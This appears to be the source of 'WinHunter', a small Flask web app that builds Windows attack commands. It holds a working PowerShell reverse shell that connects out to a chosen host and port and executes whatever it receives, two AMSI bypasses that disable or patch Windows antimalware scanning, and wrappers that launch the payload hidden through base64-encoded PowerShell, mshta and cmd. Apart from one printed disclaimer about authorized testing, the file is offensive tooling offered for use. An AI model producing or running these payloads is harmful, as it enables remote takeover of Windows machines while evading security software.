#!/usr/bin/env python3

from flask import Flask, render_template, request
import base64
import textwrap

# --- APP SETUP ---
app = Flask(__name__)

# --- PAYLOAD COMPONENTS ---
REVERSE_SHELL_LOGIC = textwrap.dedent("""
    $client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});
    $stream = $client.GetStream();
    [byte[]]$bytes = 0..65535|%{{0}};
    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
        $sendback = (iex $data 2>&1 | Out-String );
        $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
        $stream.Write($sendbyte,0,$sendbyte.Length);
        $stream.Flush()
    }};
    $client.Close()
""").strip()

AMSI_BYPASS_SIMPLE = "$a='System.Management.Automation.A';$b='msiUtils';$c=[Ref].Assembly.GetType(('{0}{1}'-f$a,$b));$d=$c.GetField(('a'+'msiInitFailed'),'NonPublic,Static');$d.SetValue($null,$true);"

AMSI_BYPASS_ADVANCED = textwrap.dedent("""
    Add-Type @'
    using System;
    using System.Runtime.InteropServices;
    public class Win32 {
        [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    }
'@;
    $Amsi = [Win32]::LoadLibrary('amsi.dll');
    $AmsiScanBuffer = [Win32]::GetProcAddress($Amsi, 'AmsiScanBuffer');
    [Win32]::VirtualProtect($AmsiScanBuffer, [UIntPtr]5, 0x40, [ref]0) | Out-Null;
    $Patch = [Byte[]](0x31, 0xc0, 0x90, 0xc3);
    [System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $AmsiScanBuffer, 4);
""").strip()


# --- HELPER FUNCTION ---
def generate_final_command(ps_command, use_base64, wrapper_type):
    """
    Takes a raw PowerShell command and wraps it for execution.
    """
    if use_base64:
        encoded_ps = base64.b64encode(ps_command.encode('utf-16-le')).decode()
        ps_launcher = f"powershell.exe -nop -w hidden -e {encoded_ps}"
    else:
        escaped_ps_command = ps_command.replace('"', '`"')
        ps_launcher = f'powershell.exe -nop -w hidden -c "{escaped_ps_command}"'

    if wrapper_type == 'none':
        return ps_launcher
    elif wrapper_type == 'mshta':
        escaped_for_vb = ps_launcher.replace('"', '""')
        return f'mshta.exe vbscript:CreateObject("Wscript.Shell").Run("{escaped_for_vb}", 0, True)'
    elif wrapper_type == 'cmd_mshta':
        escaped_for_vb = ps_launcher.replace('"', '""')
        mshta_command = f'mshta.exe vbscript:CreateObject("Wscript.Shell").Run("{escaped_for_vb}", 0, True)'
        return f'cmd.exe /c "{mshta_command}"'
    else:
        raise ValueError("Invalid wrapper type provided.")

# --- FLASK ROUTE ---
@app.route('/', methods=['GET', 'POST'])
def home():
    menu = {
        '1': ("Simple PowerShell Payload", 'none', ""),
        '2': ("Payload with Simple AMSI Bypass", 'none', AMSI_BYPASS_SIMPLE),
        '3': ("Payload with MSHTA Wrapper", 'mshta', AMSI_BYPASS_SIMPLE),
        '4': ("Payload with Advanced AMSI Bypass", 'mshta', AMSI_BYPASS_ADVANCED),
        '5': ("Payload with CMD + MSHTA Wrapper", 'cmd_mshta', AMSI_BYPASS_ADVANCED)
    }

    # Handle the initial page load (GET request)
    if request.method == 'GET':
        # On GET, we only render the template with the form menu, no results.
        return render_template('index.html', menu=menu)

    # Handle the form submission (POST request)
    if request.method == 'POST':
        context = {"menu": menu}
        try:
            choice = request.form.get('payload_type')
            lhost = request.form.get('lhost')
            lport = int(request.form.get('lport'))
            use_base64 = 'use_base64' in request.form

            desc, wrapper, amsi_logic = menu[choice]

            # Build PowerShell command
            shell_logic = REVERSE_SHELL_LOGIC.format(ip=lhost, port=lport)
            ps_command = f"{amsi_logic};{shell_logic}" if amsi_logic else shell_logic

            # Generate the final payload
            final_command = generate_final_command(ps_command, use_base64, wrapper)
            
            # Prepare data to send back to the template
            context['payload_desc'] = desc
            context['lport'] = lport
            context['final_command'] = final_command
            context['encoding_type'] = "BASE64 ENCODED" if use_base64 else "RAW (NON-ENCODED)"

        except (ValueError, KeyError) as e:
            context['error'] = f"Invalid input. Please check your values. Error: {e}"
        except Exception as e:
            context['error'] = f"An unexpected error occurred: {e}"
        
        # On POST, we render the template with the results or an error.
        return render_template('index.html', **context)

if __name__ == '__main__':
    print("🚀 WinHunter is running!")
    print("🚨 This tool is for authorized testing and educational purposes ONLY.")
    # Bind to 0.0.0.0 to make the server accessible on your network
    app.run(host='0.0.0.0', port=5000, debug=False)
